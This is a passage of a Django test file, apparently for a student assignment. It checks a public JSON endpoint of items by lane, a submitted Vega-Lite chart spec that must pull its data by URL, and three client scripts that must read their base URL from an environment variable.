        response = self.client.get(reverse("api-items-by-lane"))  # anonymous: no force_login
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/json")

        rows = response.json()
        self.assertIsInstance(rows, list, "a bare array -- see the note in vega_lite_chart.txt")
        self.assertTrue(all(isinstance(row, dict) for row in rows))
        self.assertEqual({key for row in rows for key in row}, {"lane", "label", "total"})
        self.assertTrue(all(isinstance(row["total"], int) for row in rows))
        self.assertNotIn("<", response.content.decode(), "no HTML may appear in a JSON feed")

    def test_the_public_endpoint_is_backed_by_the_database_not_by_a_constant(self):
        """A feed that returns the same three numbers whatever the tables say is a fixture."""
        before = self.client.get(reverse("api-items-by-lane")).json()
        now = timezone.now()
        space = Space.objects.create(user=User.objects.create_user("row-adder"),
                                     kind=Space.Kind.WORK)
        brief = Brief.objects.create(
            space=space, window_start=now - timedelta(hours=1), window_end=now,
            trigger=Brief.Trigger.ON_DEMAND, status=Brief.Status.READY,
            headline="Added by a test",
        )
        BriefItem.objects.create(brief=brief, title="New", lane=BriefItem.Lane.NEEDS_YOU,
                                 rank=1, summary="")
        after = self.client.get(reverse("api-items-by-lane")).json()

        needs_you = {"before": None, "after": None}
        for key, rows in (("before", before), ("after", after)):
            needs_you[key] = next(r["total"] for r in rows if r["lane"] == "needs_you")
        self.assertEqual(needs_you["after"], needs_you["before"] + 1)

    # ---- 2. the submitted Vega-Lite file ---------------------------------------------
    def test_the_submitted_spec_file_exists_and_holds_two_parseable_specs(self):
        self.assertTrue(self.SPEC_FILE.exists(), f"{self.SPEC_FILE} is the Part 3.3 deliverable")
        for spec in self.submitted_specs():
            self.assertEqual(spec["$schema"], "https://vega.github.io/schema/vega-lite/v5.json")
            self.assertIn("encoding", spec)

    def test_the_submitted_spec_pulls_from_the_public_url_and_never_inlines_data(self):
        """
        Part 3.2's hard rule: data.url, never a pasted "values" array.

        Also checks that the production block carries a PLACEHOLDER host rather than a real
        one. No deployed domain may be written into a tracked file in this project -- the
        hostname lives in .env -- and a .txt with somebody's live URL baked in is exactly the
        file that quietly becomes wrong when the site moves.
        """
        production, localhost = self.submitted_specs()
        for spec in (production, localhost):
            self.assertNotIn("values", spec["data"], "inline data is explicitly disallowed")
            self.assertTrue(spec["data"]["url"].endswith(self.PUBLIC_PATH), spec["data"]["url"])
        self.assertIn("<your-pythonanywhere-domain>", production["data"]["url"])
        self.assertTrue(localhost["data"]["url"].startswith("http://127.0.0.1:8000"),
                        "the second block must run as-is against a dev server")

    def test_every_field_in_the_submitted_spec_is_a_real_key_of_the_live_feed(self):
        """
        THE test in this class. A field name that does not exist draws an empty chart in
        total silence -- no exception, no console warning, no clue. This is the alarm.
        """
        keys = self.live_keys()
        for spec in self.submitted_specs():
            fields = set()
            for channel, definition in spec["encoding"].items():
                if isinstance(definition, dict) and "field" in definition:
                    fields.add(definition["field"])
                elif isinstance(definition, list):          # tooltip is a list of channels
                    fields.update(entry["field"] for entry in definition if "field" in entry)
            self.assertTrue(fields, "a spec with no encoded fields charts nothing")
            for field in sorted(fields):
                with self.subTest(field=field):
                    self.assertIn(field, keys,
                                  f"{field!r} is not a key of {self.PUBLIC_PATH}; the chart "
                                  f"would render empty. Live keys: {sorted(keys)}")

    def test_the_checked_in_chart1_spec_still_agrees_with_the_submitted_one(self):
        """
        The site's own chart and the submitted file must plot the same feed.

        unopsis/vega_lite/chart1_items_by_lane.vl.json drives /vega-lite/chart1/ on the site;
        docs/a5/vega_lite_chart.txt is what gets pasted into the editor. They are two files,
        so they can disagree -- and the one nobody looks at is the one that goes stale.
        """
        on_site = json.loads(
            (VEGA_LITE_DIR / VEGA_CHARTS["chart1"]["spec_file"]).read_text(encoding="utf-8")
        )
        submitted = self.submitted_specs()[0]
        self.assertTrue(on_site["data"]["url"].endswith(self.PUBLIC_PATH))
        self.assertEqual(on_site["encoding"]["x"]["field"], submitted["encoding"]["x"]["field"])
        self.assertEqual(on_site["encoding"]["y"]["field"], submitted["encoding"]["y"]["field"])

    # ---- 3. the three alternative-use programs ---------------------------------------
    def test_the_three_alternative_use_programs_exist_with_their_outputs_and_a_readme(self):
        """Part 3.4 is three programs AND the evidence that each one was really run."""
        self.assertTrue((self.SCRIPT_DIR / "README.md").exists())
        for number, name in enumerate(self.SCRIPTS, start=1):
            with self.subTest(script=name):
                self.assertTrue((self.SCRIPT_DIR / name).exists())
                output = self.SCRIPT_DIR / f"sample_output_{number}.txt"
                self.assertTrue(output.exists(), f"{output.name} holds its real stdout")
                self.assertTrue(output.read_text(encoding="utf-8").strip())

    def test_each_program_compiles_reads_the_base_url_from_the_environment_and_hardcodes_no_host(self):
        """
        Three properties, one loop, because all three are the same mistake in disguise.

        compile() catches the file that was never run since its last edit. UNOPSIS_API with a
        localhost default is what lets the same file be handed in, run locally by the grader
        and pointed at production without an edit. And the deployed hostname must not appear:
        it is not known when this is written, it lives in .env, and a script with it baked in
        is wrong the first time the site moves.
        """
        for name in self.SCRIPTS:
            with self.subTest(script=name):
                source = (self.SCRIPT_DIR / name).read_text(encoding="utf-8")
                compile(source, name, "exec")
                self.assertIn('os.environ.get("UNOPSIS_API", "http://127.0.0.1:8000")', source)
                self.assertIn(self.PUBLIC_PATH, source)
                self.assertNotIn("pythonanywhere.com", source,
                                 "the deployed host belongs in UNOPSIS_API, not in the file")
                # Every one of them must say what it does when the network misbehaves.
                self.assertIn("timeout", source.lower())
